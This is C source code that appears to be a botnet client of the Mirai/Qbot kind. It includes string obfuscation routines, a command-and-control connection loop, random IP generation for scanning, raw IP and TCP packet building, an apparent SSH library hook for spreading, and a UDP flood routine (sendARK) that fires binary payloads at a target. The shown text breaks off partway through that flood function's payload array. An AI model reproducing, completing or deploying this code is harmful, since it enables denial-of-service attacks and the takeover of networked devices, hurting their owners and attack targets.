#ifdef FREEBSD
#define PATH_MAX 260
#endif
#include <dirent.h>
#include <sys/resource.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <limits.h>
#include <stdio.h>
#include <poll.h>
#include <sys/un.h>
#include <stddef.h>
#include <sys/resource.h> //for max fds settings
#ifdef ENEMY
#include <assert.h>
void __assert_fail(const char * assertion, const char * file, unsigned int line, const char * function)
{
    abort();
}
#include "libssh2.h"

#include "libssh2_sftp.h"
 
#endif
#define PR_SET_NAME 15
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define BUFFER_SIZE 1024
#define PHI 0x9e3779b9
#define SOCKBUF_SIZE 1024
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))
#if BYTE_ORDER == BIG_ENDIAN
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | ((((unsigned long)(n) & 0xff00)) << 8) | ((((unsigned long)(n) & 0xff0000)) >> 8) | ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error
#endif
#define INET_ADDR(o1,o2,o3,o4) (HTONL((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
#define STARTUP

char hexarray[] = {
        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255
};

char hexarray2[] = {
        123, 78, 96, 110, 183, 190, 234, 18, 171, 91, 31, 44, 7, 239, 173, 172, 159, 222, 67, 114, 230, 199, 23, 105, 146, 129, 135, 84, 200, 175, 77, 253, 52, 156, 55, 243, 165, 130, 169, 86, 27, 211, 178, 233, 236, 220, 151, 39, 80, 235, 134, 226, 111, 207, 42, 71, 154, 208, 241, 66, 127, 223, 219, 103, 126, 164, 53, 218, 205, 157, 20, 215, 195, 104, 179, 76, 92, 98, 217, 9, 30, 115, 54, 70, 176, 188, 28, 119, 94, 128, 35, 168, 155, 8, 174, 180, 221, 144, 210, 206, 97, 81, 117, 249, 101, 25, 240, 120, 60, 212, 255, 185, 160, 203, 231, 3, 57, 228, 252, 90, 193, 34, 62, 237, 145, 216, 12, 5, 64, 201, 79, 65, 109, 133, 51, 83, 132, 17, 254, 6, 152, 58, 106, 26, 85, 224, 247, 143, 40, 63, 194, 59, 137, 196, 56, 11, 250, 166, 191, 131, 16, 167, 2, 99, 242, 38, 192, 150, 19, 89, 61, 68, 139, 46, 140, 93, 162, 147, 138, 14, 95, 225, 74, 73, 229, 251, 209, 4, 69, 248, 48, 37, 198, 24, 189, 204, 32, 88, 122, 232, 21, 75, 148, 136, 213, 186, 22, 113, 142, 245, 13, 187, 161, 108, 41, 47, 15, 141, 124, 118, 184, 238, 197, 1, 181, 49, 149, 29, 107, 227, 153, 244, 163, 43, 125, 158, 87, 100, 112, 72, 170, 202, 45, 214, 182, 36, 10, 246, 82, 121, 102, 33, 50, 177, 0, 116
};

char decoded[256];
char **decodedshit;
int numdecodes = 1;
char *eika(char *str)
{  
  if(strcmp(str, "") ==0) return str;
  char **decodedshit2;
  int x = 0, i = 0, c;
  if(numdecodes > sizeof(decodedshit)/(sizeof(char)*256)) numdecodes=1;
  decodedshit2 = (char**)malloc(sizeof(decodedshit));
  for (i = 0; i < numdecodes - 1; i++) decodedshit2[i] = decodedshit[i];

	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
			for(c = 0; c < sizeof(hexarray) + 1; c++)
			{
					if(str[x] == hexarray2[c])
					{
							decoded[i] = hexarray[c];
							i++;
					}
			}
		x++;
	}
	
    decodedshit2[numdecodes - 1] = decoded;
  free(decodedshit);
  decodedshit = decodedshit2;
//  puts(decoded);
  return decodedshit[numdecodes-1];
}

char encodes[] = { 
	'%', 'q', '*', 'K', 'C', ')', '&', 'F', '9', '8', 'f', 's', 'r', '2', 't', 'o', '4', 'b', '3', 'y', 'i', '_', ':', 'w', 'B', '>', 'z', '=', ';', '!', 'k', '?', '"', 'E', 'A', 'Z', '7', '.', 'D', '-', 'm', 'd', '<', 'e', 'x', '5', 'U', '~', 'h', ',', 'j', '|', '$', 'v', '6', 'c', '1', 'g', 'a', '+', 'p', '@', 'u', 'n'
	
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
	'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
	'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char **decodedgay;
char *okic(char *str)
{

  char **decodedshit2;
	int x = 0, i = 0, c;
  decodedshit2 = (char**)malloc(sizeof(decodedgay));
  for (i = 0; i < numdecodes - 1; i++) decodedshit2[i] = decodedgay[i];


	memset(decoded, 0, sizeof(decoded));
	while(x < strlen(str))
	{
		for(c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
				decoded[i] = decodes[c];
				i++;
			}
		}
		x++;
	}
    decodedshit2[numdecodes - 1] = decoded;
  free(decodedgay);
  decodedgay = decodedshit2;
  return decodedgay[numdecodes-1];

}

unsigned char *fdgets(unsigned char *, int, int);
int initConnection();
void RandString(unsigned char * buf, int length);
int sockprintf(int sock, char * formatStr, ...);
char * inet_ntoa(struct in_addr in );
int fd_cnc = -1, gotIP = 0;
unsigned char ldserver[41]; // EDIT SIZE HERE
uint32_t * pids;
int rangechoice = 1;
uint64_t numpids = 0;
struct in_addr ourIP;
struct in_addr ourPublicIP;
unsigned char macAddress[6] = {
  0
};



int util_strlen(char *str) {
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b)
        {
            if (++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while (len--)
        *zero++ = 0;
}
char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do 
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while (got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}
int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}
int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do {
		c = *str++;
	} while (util_isspace(c));
	if (c == '-') {
		neg = 1;
		c = *str++;
	} else if (c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for (acc = 0, any = 0;; c = *str++) {
		if (util_isdigit(c))
			c -= '0';
		else if (util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if (c >= base)
			break;

		if (any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else {
			any = 1;
			acc *= base;
			acc += c;
		}
	}
	if (any < 0) {
		acc = neg ? LONG_MIN : LONG_MAX;
	} else if (neg)
		acc = -acc;
	return (acc);
}
char *util_itoa(int value, int radix, char *string)
{
    if (string == NULL)
        return NULL;

    if (value != 0)
    {
        char scratch[34];
        int neg;
        int offset;
        int c;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if (radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while (accum)
        {
            c = accum % radix;
            if (c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }
        
        if (neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}
int util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if (l1 != l2)
        return 0;

    while (l1--)
    {
        if (*str1++ != *str2++)
            return 0;
    }

    return 1;
}
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

static uint32_t Q[4096], c = 362436;
void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void) {
  uint64_t t, a = 18782;
  static uint32_t i = 4095;
  uint32_t x, r = 0xfffffffe;
  i = (i + 1) & 4095;
  t = a * Q[i] + c;
  c = (uint32_t)(t >> 32);
  x = t + c;
  if (x < c) {
    x++;
    c++;
  }
  return (Q[i] = r - x);
}
void trim(char * str) {
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (util_isspace(str[begin])) begin++;
  while ((end >= begin) && util_isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}
static void printchar(unsigned char * * str, int c) {
  if (str) { * * str = c;
    ++( * str);
  } else(void) write(1, & c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
  register int pc = 0, padchar = ' ';
  if (width > 0) {
    register int len = 0;
    register
    const unsigned char * ptr;
    for (ptr = string; * ptr; ++ptr) ++len;
    if (len >= width) width = 0;
    else width -= len;
    if (pad & PAD_ZERO) padchar = '0';
  }
  if (!(pad & PAD_RIGHT)) {
    for (; width > 0; --width) {
      printchar(out, padchar);
      ++pc;
    }
  }
  for (; *string; ++string) {
    printchar(out, *string);
    ++pc;
  }
  for (; width > 0; --width) {
    printchar(out, padchar);
    ++pc;
  }

  return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;

    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints (out, print_buf, width, pad);
    }

    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN-1;
    *s = '\0';

    while (u) {
        t = u % b;
        if( t >= 10 )
        t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if( width && (pad & PAD_ZERO) ) {
        printchar (out, '-');
        ++pc;
        --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
register int width, pad;
register int pc = 0;
unsigned char scr[2];
for (; *format != 0; ++format) {
if (*format == '%') {
++format;
width = pad = 0;
if (*format == '\0') break;
if (*format == '%') goto out;
if (*format == '-') {
++format;
pad = PAD_RIGHT;
}
while (*format == '0') {
++format;
pad |= PAD_ZERO;
}
for ( ; *format >= '0' && *format <= '9'; ++format) {
width *= 10;
width += *format - '0';
}
if( *format == 's' ) {
register char *s = (char *)va_arg( args, intptr_t );
pc += prints (out, s?s:"(null)", width, pad);
continue;
}
if( *format == 'd' ) {
pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
continue;
}
if( *format == 'x' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
continue;
}
if( *format == 'X' ) {
pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
continue;
}
if( *format == 'u' ) {
pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
continue;
}
if( *format == 'c' ) {
scr[0] = (unsigned char)va_arg( args, int );
scr[1] = '\0';
pc += prints (out, scr, width, pad);
continue;
}
}
else {
out:
printchar (out, *format);
++pc;
}
}
if (out) **out = '\0';
va_end( args );
return pc;
}

int zprintf(const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print(0, format, args);
}

int szprintf(unsigned char * out,
  const unsigned char * format, ...) {
  va_list args;
  va_start(args, format);
  return print( & out, format, args);
}

int sockprintf(int sock, char * formatStr, ...) {
  unsigned char * textBuffer = malloc(2048);
  memset(textBuffer, 0, 2048);
  char * orig = textBuffer;
  va_list args;
  va_start(args, formatStr);
  print(&textBuffer, formatStr, args);
  va_end(args);
  orig[strlen(orig)] = '\n';
  int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
  free(orig);
  return q;
}


int getHost(unsigned char * hostname, struct in_addr * in) {
	
    int result = inet_pton(AF_INET, hostname, in);
    if(result != 0) {
		return 0;
	}
	struct addrinfo hints, * servinfo, * p;
    struct sockaddr_in * h;
    int rv;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo(hostname, NULL, &hints,&servinfo)) != 0) {
        return 1;
    }

    // loop through all the results and connect to the first we can
    for (p = servinfo; p != NULL; p = p->ai_next) {
        h = (struct sockaddr_in * ) p->ai_addr;
		
		bcopy(in, &h->sin_addr, p->ai_addrlen);
    }
	return 0;
	
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
struct sockaddr_in dest_addr;
fd_set myset;
struct timeval tv;
socklen_t lon;

int valopt;
long arg = fcntl(fd, F_GETFL, NULL);
arg |= O_NONBLOCK;
fcntl(fd, F_SETFL, arg);

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = HTONS(port);
if(getHost(host, &dest_addr.sin_addr)) return 0;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

if (res < 0) {
if (errno == EINPROGRESS) {
tv.tv_sec = timeout;
tv.tv_usec = 0;
FD_ZERO(&myset);
FD_SET(fd, &myset);
if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
lon = sizeof(int);
getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if (valopt) return 0;
}
else return 0;
}
else return 0;
}

arg = fcntl(fd, F_GETFL, NULL);
arg &= (~O_NONBLOCK);
fcntl(fd, F_SETFL, arg);

return 1;
}


int mytoupper(int ch)
{
        if(ch >= 'a' && ch <= 'z')
                return ('A' + ch - 'a');
        else
                return ch;
}
void uppercase(unsigned char * str) {
  while ( * str) { * str = mytoupper( * str);
    str++;
  }
}

void RandString(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = (rand_cmwc() % (91 - 65)) + 65;
}

void RandBytes(unsigned char * buf, int length) {
  int i = 0;
  for (i = 0; i < length; i++) buf[i] = rand_cmwc() % 256;
}

int recvLine(unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        fd_set errors;
        struct timeval tv;
        tv.tv_sec = 7;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_ZERO(&errors);
        FD_SET(fd_cnc, &myset);
        FD_SET(fd_cnc, &errors);
        int selectRtn, retryCount, dataAvailable;
        if ((selectRtn = select(fd_cnc+1, &myset, NULL, &errors, &tv)) <= 0) {
                if(FD_ISSET(fd_cnc, &errors)) return -1;
                while(retryCount < 10)
                {
                        sockprintf(fd_cnc, "PING");
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_ZERO(&errors);
                        FD_SET(fd_cnc, &myset);
                        FD_SET(fd_cnc, &errors);
                        if ((selectRtn = select(fd_cnc+1, &myset, NULL, &errors, &tv)) <= 0) {
                                if(FD_ISSET(fd_cnc, &errors)) return -1;
                                retryCount++;
                                continue;
                        }
                        if(FD_ISSET(fd_cnc, &errors)) return -1;
                        break;
                }
        }

        if(FD_ISSET(fd_cnc, &errors)) return -1;
        ioctl(fd_cnc, FIONREAD, &dataAvailable);
        if(dataAvailable) {
            unsigned char tmpchr;
            unsigned char *cp;
            int count = 0;

            cp = buf;
            while(bufsize-- > 1)
            {
                    if(recv(fd_cnc, &tmpchr, 1, 0) == 0) {
                            *cp = 0x00;
                            return -1;
                    }
                    *cp++ = tmpchr;
                    if(tmpchr == '\n') break;
                    count++;
            }
            *cp = 0x00;

//      zprintf("recv: %s\n", cp);
    
            return count;
        } else {
            return 0;
        }
}
int listFork() {
  uint32_t parent, * newpids, i;
  parent = fork();
  if (parent <= 0) return parent;
  numpids++;
  newpids = (uint32_t * ) malloc((numpids + 1) * 4);
  for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
  newpids[numpids - 1] = parent;
  free(pids);
  pids = newpids;
  return parent;
}

in_addr_t GetRandomIP(in_addr_t netmask) {
  in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
  return tmp ^ (rand_cmwc() & ~netmask);
}

unsigned short csum(unsigned short * buf, int count) {
  register uint64_t sum = 0;
  while (count > 1) {
    sum += * buf++;
    count -= 2;
  }
  if (count > 0) {
    sum += * (unsigned char * ) buf;
  }
  while (sum >> 16) {
    sum = (sum & 0xffff) + (sum >> 16);
  }
  return (uint16_t)(~sum);
}
/* Copyright (C) 1991,92,93,95,96,97,98,99,2000 Free Software Foundation, Inc.
   This file is part of the GNU C Library.
   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.
   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.
   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, write to the Free
   Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA
   02111-1307 USA.  */
#include <sys/types.h>
#include <netinet/in.h>
struct timestamp
  {
    uint8_t len;
    uint8_t ptr;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int flags:4;
    unsigned int overflow:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int overflow:4;
    unsigned int flags:4;
#else
# error	"Please fix <bits/endian.h>"
#endif
    uint32_t data[9];
  };
struct iphdr
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4;
    unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int version:4;
    unsigned int ihl:4;
#else
# error	"Please fix <bits/endian.h>"
#endif
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
    /*The options start here. */
  };
struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ip_hl:4;		/* header length */
    unsigned int ip_v:4;		/* version */
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ip_v:4;		/* version */
    unsigned int ip_hl:4;		/* header length */
#endif
    uint8_t ip_tos;			/* type of service */
    u_short ip_len;			/* total length */
    u_short ip_id;			/* identification */
    u_short ip_off;			/* fragment offset field */
#define	IP_RF 0x8000			/* reserved fragment flag */
#define	IP_DF 0x4000			/* dont fragment flag */
#define	IP_MF 0x2000			/* more fragments flag */
#define	IP_OFFMASK 0x1fff		/* mask for fragmenting bits */
    uint8_t ip_ttl;			/* time to live */
    uint8_t ip_p;			/* protocol */
    u_short ip_sum;			/* checksum */
    struct in_addr ip_src, ip_dst;	/* source and dest address */
  };
/*
 * Time stamp option structure.
 */
struct ip_timestamp
  {
    uint8_t ipt_code;			/* IPOPT_TS */
    uint8_t ipt_len;			/* size of structure (variable) */
    uint8_t ipt_ptr;			/* index of current entry */
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ipt_flg:4;		/* flags, see below */
    unsigned int ipt_oflw:4;		/* overflow counter */
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int ipt_oflw:4;		/* overflow counter */
    unsigned int ipt_flg:4;		/* flags, see below */
#endif
    uint32_t data[9];
  };
/*
 * User-settable options (used with setsockopt).
 */
#define	TCP_NODELAY	 1	/* Don't delay send to coalesce packets  */

typedef	uint32_t tcp_seq;
/*
 * TCP header.
 * Per RFC 793, September, 1981.
 */
struct tcphdr
  {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
#  if __BYTE_ORDER == __LITTLE_ENDIAN
    uint16_t res1:4;
    uint16_t doff:4;
    uint16_t fin:1;
    uint16_t syn:1;
    uint16_t rst:1;
    uint16_t psh:1;
    uint16_t ack:1;
    uint16_t urg:1;
    uint16_t res2:2;
#  elif __BYTE_ORDER == __BIG_ENDIAN
    uint16_t doff:4;
    uint16_t res1:4;
    uint16_t res2:2;
    uint16_t urg:1;
    uint16_t ack:1;
    uint16_t psh:1;
    uint16_t rst:1;
    uint16_t syn:1;
    uint16_t fin:1;
#  else
#   error "Adjust your <bits/endian.h> defines"
#  endif
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};
enum
{
  TCP_ESTABLISHED = 1,
  TCP_SYN_SENT,
  TCP_SYN_RECV,
  TCP_FIN_WAIT1,
  TCP_FIN_WAIT2,
  TCP_TIME_WAIT,
  TCP_CLOSE,
  TCP_CLOSE_WAIT,
  TCP_LAST_ACK,
  TCP_LISTEN,
  TCP_CLOSING   /* now a valid state */
};
unsigned short tcpcsum(struct iphdr * iph, struct tcphdr * tcph) {

  struct tcp_pseudo {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
  }
  pseudohead;
  unsigned short total_len = iph->tot_len;
  pseudohead.src_addr = iph->saddr;
  pseudohead.dst_addr = iph->daddr;
  pseudohead.zero = 0;
  pseudohead.proto = IPPROTO_TCP;
  pseudohead.length = HTONS(sizeof(struct tcphdr));
  int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
  unsigned short * tcp = malloc(totaltcp_len);
  memcpy((unsigned char * ) tcp, & pseudohead, sizeof(struct tcp_pseudo));
  memcpy((unsigned char * ) tcp + sizeof(struct tcp_pseudo), (unsigned char * ) tcph, sizeof(struct tcphdr));
  unsigned short output = csum(tcp, totaltcp_len);
  free(tcp);
  return output;
}

void makeIPPacket(struct iphdr * iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = sizeof(struct iphdr) + packetSize;
  iph->id = rand_cmwc();
  iph->frag_off = 0;
  iph->ttl = 255;
  iph->protocol = protocol;
  iph->check = 0;
  iph->saddr = source;
  iph->daddr = dest;
}


int sclose(int fd) {
  if (3 > fd) return 1;
  close(fd);
  return 0;
}

int socket_connect(char * host, uint16_t port) {
	struct sockaddr_in addr;
	int on = 1, sock;
	if(getHost(host, &addr.sin_addr)) return -1;
	addr.sin_port = HTONS(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char * ) & on, sizeof(int));
	if (sock == -1) return 0;
	if (connect(sock, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1)
	return 0;
	return sock;
}
void sendARK(unsigned char*host, int port, int secs) {
	
	int a = 0;
	int start = time(NULL);
    int sockfd, portno, n;
    int serverlen;
    struct sockaddr_in serveraddr;

    /* socket: create the socket */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) 
        return;


    /* build the server's Internet address */
    bzero((char *) &serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    if (getHost(host, & serveraddr.sin_addr)) return;
    serveraddr.sin_port = HTONS(port);

    /* send the message to the server */
    serverlen = sizeof(serveraddr);
char *randstrings[] = {"\xa0\xdc\x94\x6f\x5a\x29\x07\x00\x34\x04\xb9\xa9\x27\x06\x68\xf7\x04\x9d\x00\x00\x00\xbc\x1c\x85\xb5\x95\xbd\x34\xbd\x91\xcd\xbd\x50\xa1\x95\x0d\x95\xb9\xd1\x95\xc9\xbd\x50\xa1\x95\x0d\x95\xb9\xd1\x95\xc9\x7d\x09\x95\x85\x8d\xa1\x05\xc5\x00\x00\x00\x00\x00\xf4\xcc\x00\xed\xc6\xa0\x15\x00\x00\x80\x97\xa3\xb0\xb6\xb2\x97\xa6\x37\xb2\xb9\x17\x2a\xb4\xb2\xa1\x32\x37\xba\x32\xb9\x17\x2a\xb4\xb2\xa1\x32\x37\xba\x32\xb9\x2f\xa1\xb2\xb0\x31\xb4\xa0\x18\xa7\xb2\x30\x39\x00\x00\x00\x00\x80\x9e\x18\xa0\xdd\x13\x74\x02\x00\x00\xf0\x72\x14\xd6\x56\xf6\xd2\xf4\x46\x36\xf7\x42\x85\x56\x36\x54\xe6\x46\x57\x26\xf7\x42\x85\x56\x36\x54\xe6\x46\x57\x26\xf7\x25\x54\x16\x36\x86\x16\x24\x03\x00\x00\x00\x00\xd0\x33\x03\xb4\x1b\x83\x56\x00\x00\x00\x5e\x8e\xc2\xda\xca\x5e\x9a\xde\xc8\xe6\x5e\xa8\xd0\xca\x86\xca\xdc\xe8\xca\xe4\x5e\xa8\xd0\xca\x86\xca\xdc\xe8\xca\xe4\xbe\x84\xca\xc2\xc6\xd0\x82\x64\x9c\xca\xc2\xe4\x00\x00\x00\x00\x00\x7a\x69\x80\x76\x66\x90\x0b\x00\x00\xc0\xcb\x51\x58\x5b\xd9\x4b\xd3\x1b\xd9\xdc\x0b\x15\x5a\xd9\x50\x99\x1b\x5d\x99\xdc\x0b\x15\x5a\xd9\x50\x99\x1b\x5d\x99\xdc\x17\x53\x98\x5d\x98\x50\xd8\xd8\xda\x99\xdc\x5b\x9d\x1b\x19\x00\x00\x00\x00\x40\xaf\x0c\xd0\x4e\x0c\x52\x01\x00\x00\x78\x39\x0a\x6b\x2b\x7b\x69\x7a\x23\x9b\x7b\xa1\x42\x2b\x1b\x2a\x73\xa3\x2b\x93\x7b\xa1\x42\x2b\x1b\x2a\x73\xa3\x2b\x93\xfb\x92\x4a\xb3\x2b\x93\x73\x7a\x93\xa3\x43\x03\x00\x00\x00\x00\xb8\xc5\xec\x62\x7e\x31\xc3\x98\x07\xfa\x95\x21\xc6\x98\x65\xcc\x33\x66\x1a\x73\x8d\xd9\xc6\x7c\x63\xc6\x31\xe7\x98\x75\xcc\x3b\x66\x1e\x73\x8f\xd9\xc7\xfc\x63\x06\x32\x0d\x32\x0b\x99\x87\xcc\x44\xe6\x22\xb3\x91\xf9\xc8\x8c\x64\x4e\x32\x2b\x99\x97\xcc\x4c\xe6\x26\xb3\x93\xf9\xc9\x0c\x65\x1a\x65\x96\x32\x4f\x99\xa9\xcc\x55\